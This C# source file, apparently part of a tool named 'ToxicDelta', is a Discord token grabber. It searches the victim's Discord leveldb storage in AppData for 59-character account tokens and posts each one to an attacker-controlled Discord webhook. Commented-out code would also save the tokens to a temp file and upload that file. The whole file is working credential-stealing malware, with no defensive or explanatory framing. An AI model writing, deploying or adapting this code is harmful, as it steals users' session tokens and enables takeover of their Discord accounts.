using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Text.RegularExpressions;
using Discord;
using Discord.Webhook;

namespace ToxicDelta
{
    class TknGrabber
    {
        public class DiscordToken
        {
            public static async Task DiscordTkn(string webhookUrl)
            {
                await GetToken(webhookUrl);
            }

            public static async Task GetToken(string webhookUrl)
            {
                Console.BackgroundColor = ConsoleColor.Magenta;
                var client = new DiscordWebhookClient(webhookUrl);
                var files = SearchForFile(); // to get ldb files
                if (files.Count == 0)
                {
                    Console.WriteLine("Didn't find any ldb files");
                    await client.SendMessageAsync(
                        text: "Token not found (LDB file not found)",
                        username: "ToxicDelta",
                        isTTS: false
                        );
                    return;
                }

                foreach (string token in files)
                {
                    foreach (Match match in Regex.Matches(token, "[^\"]*"))
                    {
                        if (match.Length == 59)
                        {
                            Console.WriteLine($"Token = {match}");
                            string tempPath = Path.GetTempPath();
                            string filePath = Path.Combine(tempPath, "Token.txt");

                            await client.SendMessageAsync(
                                text: "",
                                username: "ToxicDelta",
                                isTTS: false,
                                embeds: new[]
                                {
                                    new EmbedBuilder()
                                    .WithTitle("Token Found!")
                                    .WithDescription($"Token = ||{match}||")
                                    .WithColor(Color.Blue)
                                    .Build()
                                });

                            /*
                            using (StreamWriter sw = new StreamWriter(filePath, true))
                            {
                                //sw.WriteLine($"Token = {match}");
                            }

                            await client.SendFilesAsync(attachment, "Token(s)", username: "ToxicDelta");
                            */
                        }
                    }
                }
            }

            private static List<string> SearchForFile()
            {
                List<string> ldbFiles = new List<string>();
                string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

                if (!Directory.Exists(discordPath))
                {
                    Console.WriteLine("Discord path not found");
                    return ldbFiles;
                }

                foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
                {
                    string rawText = File.ReadAllText(file);
                    if (rawText.Contains("oken"))
                    {
                        Console.WriteLine($"{Path.GetFileName(file)} added");
                        ldbFiles.Add(rawText);
                    }
                }

                Console.ResetColor();
                return ldbFiles;
            }
        }
    }
}
